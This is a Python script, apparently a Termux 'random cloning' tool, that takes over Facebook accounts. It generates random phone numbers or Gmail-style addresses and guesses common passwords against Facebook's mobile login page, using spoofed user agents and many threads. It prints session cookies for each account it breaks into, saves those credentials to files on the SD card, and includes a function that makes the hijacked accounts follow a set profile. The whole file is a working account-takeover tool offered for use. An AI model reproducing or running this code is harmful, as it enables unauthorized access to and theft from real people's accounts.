import os,time
os.system('clear')
print('  [âˆš] ----- ðŸ‘‰ ASSALAMU ALAYKUM ðŸ‘ˆ .....');time.sleep(1)
try:
    import requests
except ImportError:
    print('\n [âˆš] installing requests !...\n')
    os.system('pip install requests')
try:
    import concurrent.futures
except ImportError:
    print('\n [âˆš] installing futures !...\n')
    os.system('pip install futures')
try:
    import bs4
except ImportError:
    print('\n [âˆš] installing bs4 !...\n')
    os.system('pip install bs4')
try:
    import rich
except ImportError:
    print('\n [âˆš] installing rich !...\n')
    os.system('pip install rich')
import requests,bs4,json,sys,random,datetime,time,re,subprocess,platform,struct
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as ThreadPool
import os
import random
import requests,bs4,json,sys,random,datetime,time,re,subprocess,platform,struct
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
import base64
import os,sys,time,json,random,re,string,platform,base64
import requests
from concurrent.futures import ThreadPoolExecutor as ThreadPool
import mechanize
from requests.exceptions import ConnectionError
import string
R = '\033[1;31m' # PUTIH
G = '\033[1;32m' # PUTIH
H = '\033[1;32m' # PUTIH
Y = '\033[1;33m' # PUTIH
Q = '\033[1;37m'
T = '\033[1;34m'
import requests, os, re, bs4,platform, sys, json, time, random, datetime, subprocess, threading, itertools,base64,uuid,zlib
from concurrent.futures import ThreadPoolExecutor as ahmadAXI
from datetime import datetime
from bs4 import BeautifulSoup
R = '\x1b[1;91m' 
G = '\x1b[1;92m' 
Y = '\x1b[1;93m' 
### WARNA RANDOM ###
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
MXD = '\033[1;92m' #MAHADIGREEN
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
A = '\x1b[1;90m' # WARNA ABU ABU
BN = '\x1b[1;107m' # BELAKANG PUTIH
BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
BP = '\x1b[1;105m' # BELAKANG PINK
BB = '\x1b[1;104m' # BELAKANG BIRU
BK = '\x1b[1;103m' # BELAKANG KUNING
BH = '\x1b[1;102m' # BELAKANG HIJAU
BM = '\x1b[1;101m' # BELAJANG MERAH
BA = '\x1b[1;100m' # BELAKANG ABU ABU
ct = datetime.now()
n = ct.month
bulan = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'Agustus', 'September', 'October', 'November', 'December']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()
import requests
import bs4
import sys
import os
import random
import time
import re
import json
import uuid
import subprocess
import marshal
import rich
import shutil
import webbrowser
from random import randint
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from bs4 import BeautifulSoup as par
from datetime import date
from datetime import datetime
from datetime import date
import marshal
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures==2 > /dev/null')
    os.system('python SHORIFUL.py')
from bs4 import BeautifulSoup
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
P = '\x1b[1;97m' # 
M = '\033[1;31m' # 
H = '\033[1;32m' # 
K = '\x1b[1;97m' # 
B = '\x1b[1;97m' # 
U = '\x1b[1;95m' # 
O = '\x1b[1;97m' # 
N = '\x1b[0m'    # 
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
B1 = '7463' # BIRU
U1 = '6253' # UNGU
O1 = '8363' # BIRU MUDA
N1 = '10724'    # WARNA MATI
A1 = '73535' # WARNA ABU ABU
BN1 = '93524' # BELAKANG PUTIH
BBL1 = '75424' # BELAKANG BIRU LANGIT
BP1 = '8255' # BELAKANG PINK
BB1 = '19934' # BEL AKANG BIRU
my_color1 = [
 B1,U1,O1,N1,A1,BN1,BBL1,BB1,BP1]
warna1 = random.choice(my_color1)
data,data2={},{}
aman,cp,salah=0,0,0
ubahP,fuck,pwBaru=[],[],[]
ok = []
mnum=[]
cp = []
id = []
twf = []
user = []
loop = 0
oks = []
cps = []
loop = 0
url_lookup = "https://lookup-id.com/"
url_mb = "https://m.facebook.com"
url_ip = "https://www.httpbin.org/ip"
header_grup = {"user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"}
bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}
done = False
ugen=[]
uas=[]
gt = random.choice(['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550   5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750'])
ugen=[]
useragent=[]
for xd in range(10000):
        aa='Mozilla/5.0 (Linux; U; Android'
        b=random.choice(['6','7','8','9','10','11','12','13'])
        c=f' TL-tl; {str(gt)}'
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/537.36'
        uaku2=f'{aa} {b}; {c}) {g}{h}.{i}.{j}.{k} {l}'
        ugen.append(uaku2)
for agent in range(10000):
        aa='Mozilla/5.0 (Linux; Android 6.0.1;'
        b=random.choice(['6','7','8','9','10','11','12'])
        c='en-us; 10; T-Mobile myTouch 3G Slide Build/'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/533.1'
        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
        ugen.append(fullagnt)
for x in range(10000):
	aa='Mozilla/5.0 (Windows NT 6.1; WOW64)'
	b=random.choice(['4','5','6','7','8','9','10','11','12'])
	c='ASUS_I006D Build/RKQ1.201022.002'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.3'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36 Sleipnir/3.5.28'
	uakua=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	useragent.append(uakua)

class slower:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.040)
            
logo=("""\033[38;5;195m


   _____ _    _  ____  _____  _____ ______ _    _ _  
  / ____| |  | |/ __ \|  __ \|_   _|  ____| |  | | | 
 | (___ | |__| | |  | | |__) | | | | |__  | |  | | | 
  \___ \|  __  | |  | |  _  /  | | |  __| | |  | | | 
  ____) | |  | | |__| | | \ \ _| |_| |    | |__| | | 
 |_____/|_|  |_|\____/|_|  \_\_____|_|     \____/|_| 
\033[1;32m-----------------------------------------------------
\033[38;5;195m[\033[38;5;46mâˆš\033[38;5;195m] ADMIN       : SHORIFUL
\033[38;5;195m[\033[38;5;46mâˆš\033[38;5;195m] FACEBOOK    : Shoriful islam
\033[38;5;195m[\033[38;5;46mâˆš\033[38;5;195m] VERSION     : \033[38;5;196m1.0.0 \033[38;5;46mPAIND
\033[1;32m-----------------------------------------""")

tn =('\033[1;32m-----------------------------------------')
tarik=(f"\033[38;5;195m[\033[38;5;46mâˆš\033[38;5;195m] DATE TIME   : {ha}/{bu}/{ta} \033[38;5;195m> \033[1;32m"+str(a)+":"+str(lt()[4])+" "+ tag+" ")
def cek_apk(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print('\033[38;5;46m[SHORIFUL-OK] '+uid+'|'+ps+' âˆš '+roksana(uid)+'\n\033[38;5;195m[\033[1;35mCOOKIE\033[38;5;195m] \033[1;34m'+coki+'')
    else:
        print('\033[38;5;46m[SHORIFUL-OK] '+uid+'|'+ps+' âˆš '+roksana(uid)+'\n\033[38;5;195m[\033[1;35mCOOKIE\033[38;5;195m] \033[1;34m'+coki+'')

 

def follow(ses,coki):
    ses.headers.update({"accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
    r = sop(ses.get('https://mbasic.facebook.com/profile.php?id=100001020800712', cookies={'cookie': coki}).text, 'html.parser')
    get = r.find('a', string='Follow').get('href')
    ses.get(('https://mbasic.facebook.com' + str(get)), cookies={'cookie': coki}).text

SHORIFULk="SHORIFUL-SETU"
myid=uuid.uuid4().hex[:20].upper()
try:
    key1 = open('/data/data/com.termux/files/usr/bin/.MRD-cov', 'r').read()
except:
    kok=open('/data/data/com.termux/files/usr/bin/.MRD-cov', 'w')
    kok.write(myid+SHORIFULk)
    kok.close()
def Subscraption():
    key1=open('/data/data/com.termux/files/usr/bin/.MRD-cov', 'r').read()
    os.system('clear')
    print(logo)
    r1=requests.get("https://raw.githubusercontent.com/SHORIFUL-CYBER-143/SHORIFUL-PRO/main/Key.txt").text
    if key1 in r1:
        os.system('clear')
        print(logo)
        main_menu()
    else:
        os.system("clear")
        print(logo)
        print ("\033[38;5;196m[\033[1;32m+\033[38;5;196m]\033[1;32m Your Key : "+SHORIFULk+key1)
        input("\033[38;5;196m[\033[1;32m+\033[38;5;196m]\033[1;32m\033[1;32m Enter To Send Key")
        time.sleep(3.5)
        tks = 'DEAR%20SIR%20I%20WANT%20TO%20BUY%20YOUR%20CRACK-FILE%20PAID%20TOOL%20%20%20%20%20%20%20%20%20%20%20'+SHORIFULk+''+key1
        os.system('xdg-open https://wa.me/+8801721474011?text=' + tks) 
        Subscraption()

def roksana(fx):
    if len(fx)==15:
        if fx[:10] in ['1000000000']       :roksanaz = '2009'
        elif fx[:9] in ['100000000']       :roksanaz = '2009'
        elif fx[:8] in ['10000000']        :roksanaz = '2009'
        elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:roksanaz = '2009'
        elif fx[:7] in ['1000006','1000007','1000008','1000009']:roksanaz = '2010'
        elif fx[:6] in ['100001']          :roksanaz = '2010-2011'
        elif fx[:6] in ['100002','100003'] :roksanaz = '2011-2012'
        elif fx[:6] in ['100004']          :roksanaz = '2012-2013'
        elif fx[:6] in ['100005','100006'] :roksanaz = '2013-2014'
        elif fx[:6] in ['100007','100008'] :roksanaz = '2014-2015'
        elif fx[:6] in ['100009']          :roksanaz = '2015'
        elif fx[:5] in ['10001']           :roksanaz = '2015-2016'
        elif fx[:5] in ['10002']           :roksanaz = '2016-2017'
        elif fx[:5] in ['10003']           :roksanaz = '2018'
        elif fx[:5] in ['10004']           :roksanaz = '2019'
        elif fx[:5] in ['10005']           :roksanaz = '2020'
        elif fx[:5] in ['10006','10007']:roksanaz = '2021-2022'
        elif fx[:5] in ['10008']:roksanaz = '2022'
        elif fx[:5] in ['10009']:roksanaz = '2023'
        else:roksanaz=''
    elif len(fx) in [9,10]:
        roksanaz = '2008-2009'
    elif len(fx)==8:
        roksanaz = '2007-2008'
    elif len(fx)==7:
        roksanaz = '2006-2007'
    else:roksanaz=''
    return roksanaz
    


def main_menu():
    os.system('clear')
    print(logo)
    print(tarik)
    print(tn)
    print('\033[38;5;195m[\033[38;5;206m1\033[38;5;195m] START RANDOM  CLONING - ')
    print('\033[38;5;195m[\033[38;5;206m2\033[38;5;195m] START GMAIL CLONING - ')
    mt=input('\033[38;5;195m[\033[38;5;203m??\033[38;5;195m] CHOOSE - ')
    if mt in '1':
        method1()
    if mt in '2':
        method2()
    if mt in '3':
        method3()
    if mt in '4':
        gmail()
    

def method1():
    user=[]
    os.system('clear')
    print(logo)
    print("\033[38;5;195m[\033[38;5;46mâˆš\033[38;5;195m] SIM CODE - 016 / 017 / 018 / 019");print(tn)
    code = input('\033[38;5;195m[\033[38;5;46mâˆš\033[38;5;195m] YOUR CODE - ');print(tn)
    limit = int(input('\033[38;5;195m[\033[38;5;46m??\033[38;5;195m] CRACK LIMIT - '));
    print(tn)
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with ThreadPool(max_workers=50) as tabassum:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print('\033[38;5;195m[\033[38;5;46mâˆš\033[38;5;195m] SIM CODE :- '+code+' \033[1;33m>\033[1;36m> \033[38;5;195mMethod \033[1;33m>\033[1;36m> \033[38;5;195mM1')
        slower('\033[38;5;195m[\033[38;5;46mâˆš\033[38;5;195m]\033[38;5;208m USE AIRPALNE MODE ON/OFF FOR SPEED UP')
        print(tn)
        for guru in user:
            uid = code+guru
            pwx = [guru,uid,'bangladesh','i love you','@#@#@#','123890']
            tabassum.submit(beeq,uid,pwx,tl)
    print(tn)
    print('\033[38;5;195m[\033[38;5;46mâˆš\033[38;5;195m]\033[38;5;195m TOTAL OK/CP/2F : '+str(len(ok))+'/'+str(len(cp))+'/'+str(len(twf)))
    print('[\033[38;5;46mâˆš\033[38;5;195m]\033[38;5;195m TOTAL ID SAVE IN EXTERNAL STORAGE')
    print(tn)

def method2():
    user=[]
    os.system('clear')
    print(logo)
    print("\033[38;5;195m[\033[38;5;46mâˆš\033[38;5;195m] SIM CODE - 017* / 018* / 019*");print(tn)
    code = input('\033[38;5;195m[\033[38;5;46mâˆš\033[38;5;195m] YOUR CODE - ');print(tn)
    limit = int(input('\033[38;5;195m[\033[38;5;46m??\033[38;5;195m] CRACK LIMIT - '))
    print(tn)
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=50) as tabassum:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print('\033[38;5;195m[\033[38;5;46mâˆš\033[38;5;195m] SIM CODE :- '+code+' \033[1;33m>\033[1;36m> \033[38;5;195mMethod \033[1;33m>\033[1;36m> \033[38;5;195mM2')
        slower('\033[38;5;195m[\033[38;5;46mâˆš\033[38;5;195m]\033[38;5;208m USE FLIGHT MODE FOR SPEED UP')
        print(tn)
        for guru in user:
            uid = code+guru
            pwx = [guru,uid,'bangladesh','i love you','@#@#@#','123890','786786','fflover','free fire','ffking']
            tabassum.submit(beeq,uid,pwx,tl)
    print(tn)
    print('\033[38;5;195m[\033[38;5;46mâˆš\033[38;5;195m]\033[38;5;195m TOTAL OK/CP/2F : '+str(len(ok))+'/'+str(len(cp))+'/'+str(len(twf)))
    print('[\033[38;5;46mâˆš\033[38;5;195m]\033[38;5;195m TOTAL ID SAVE IN EXTERNAL STORAGE')
    print(tn)

def method3():
    user=[]
    os.system('clear')
    print(logo)
    print("\033[38;5;195m[\033[38;5;46mâˆš\033[38;5;195m] SIM CODE - 017 / 018 / 019");print(tn)
    kode = input('\033[38;5;195m[\033[38;5;46mâˆš\033[38;5;195m] YOUR CODE - ');print(tn)
    limit = int(input('\033[38;5;195m[\033[38;5;46m??\033[38;5;195m] CRACK LIMIT - '))
    for nmbr in range(limit):
        koda = ''.join(random.choice(string.digits) for _ in range(2))
        kodb = ''.join(random.choice(string.digits) for _ in range(2))
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    with ThreadPool(max_workers=50) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print('\033[38;5;195m[\033[38;5;46mâˆš\033[38;5;195m] SIM CODE :- '+kode+' \033[1;33m>\033[1;36m> \033[38;5;195mMethod \033[1;33m>\033[1;36m> \033[38;5;195mM3')
        slower('\033[38;5;195m[\033[38;5;46mâˆš\033[38;5;195m]\033[38;5;208m USE FLIGHT MODE FOR SPEED UP')
        print(tn)
        for guru in user:
            uid = kode+koda+kodb+guru
            pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,kode+kode,kode+'123',kode+'1234','bangladesh','i love you','freefire1122','pubg123']
            yaari.submit(beeq,uid,pwx,tl)
    
def gmail():
    user=[]
    os.system('clear')
    print(logo)
    kode = input('\033[38;5;195m[\033[38;5;46mâˆš\033[38;5;195m] FIRST NAME  :\033[1;32m ')
    print(tn)
    kodex = input('\033[38;5;195m[\033[38;5;46mâˆš\033[38;5;195m] LAST NAME   :\033[1;32m ')
    print(tn)
    print('\033[38;5;195m[\033[38;5;46mâˆš\033[38;5;195m] DOMAIN      :\033[38;5;46m @gmail.com')
    print(tn)
    doamin = input('\033[38;5;195m[\033[38;5;46mâˆš\033[38;5;195m] ENTER DOMAIN : ')
    print(tn)
    limit = int(input('\033[38;5;195m[\033[38;5;46mâˆš\033[38;5;195m] How many numbers do you want to add : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(1,4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as setu:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print(f'\033[38;5;195m[\033[38;5;46mâˆš\033[38;5;195m] GMAIL       : '+kode+''+kodex+' <> '+tl)
        print(f'\033[38;5;195m[\033[38;5;46mâˆš\033[38;5;195m] FILE SAVE   : \033[38;5;46m/SDCARD/SHORIFUL-OK.txt')
        print(f'\033[38;5;195m[\033[38;5;46mâˆš\033[38;5;195m] FILE SAVE   : \033[38;5;196m/SDCARD/SHORIFUL-CP.txt')
        print(tn)
        for guru in user:
            uid = kode+kodex+guru+doamin
            pwx = [kode,kodex,kode+kodex,kode+'123',kode+'1234',kode+'12345',kode+guru,kodex+'123',kodex+'1234',kodex+'12345',kode+'1122',kode+'007']
            setu.submit(beeq,uid,pwx,tl)

def beeq(uid,pwx,tl):
    global loop
    global cps
    global ok
    global agents
    global ugen
    try:
        for ps in pwx:
            session = requests.Session()
            sys.stdout.write(f'\r\033[38;5;195m[SHORIFUL-XD\033[38;5;195m] %s|OK-\033[38;5;46m%s\r'%(loop,len(ok))),
            sys.stdout.flush()
            pro = random.choice(useragent)
            free_fb = session.get('https://m.alpha.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {"authority": 'm.alpha.facebook.com',
            'method': 'POST',
			'scheme': 'https',
			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
			'accept-encoding':'utf-8','accept-language': 'en-US,en;q=0.9',
			'cache-control': 'max-age=0',
			'sec-ch-ua': '"Google Chrome";v="100", "Not)A;Brand";v="99", "Chromium";v="100"',
			'sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"',
			'sec-fetch-dest': 'document',
			'sec-fetch-mode': 'navigate',
			'sec-fetch-site': 'none',
			'sec-fetch-user': '?1',
			'upgrade-insecure-requests': '1',
            "user-agent": pro}
            lo = session.post('https://m.alpha.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                coki1 = coki.split("1000")[1]
                uid = "1000"+coki1[0:11]
                print('\033[38;5;46m[SHORIFUL-OK] '+uid+'|'+ps+' âˆš '+roksana(uid)+'\n\033[38;5;195m[\033[1;35mCOOKIE\033[38;5;195m] \033[1;34m'+coki+'')
                ok.append(uid)
                open('/sdcard/SHORIFUL-X-OK.txt', 'a').write(uid+' | '+ps+'\n')
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                coki1 = coki.split("1000")[1]
                uid = "1000"+coki1[0:11]
                print(f'\033[38;5;206m[SHORIFUL-CP] '+uid+'|'+ps+' âœ“ '+roksana(uid)+'\033[36;1m')
                open('/sdcard/SHORIFUL-X-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cp.append(uid)
                break
            elif '/x/checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                coki1 = coki.split("1000")[1]
                uid = "1000"+coki1[0:11]
                print(f'\033[38;5;208m[SHORIFUL-2F] '+uid+'|'+ps+' âœ“ '+roksana(uid)+'\033[36;1m')
                open('/sdcard/SHORIFUL-X-2F.txt', 'a').write(uid+' | '+ps+'\n')
                twf.append(uid)
                break
            else:
                continue
        loop+=1
    except:
        pass

#Subscraption()
main_menu()
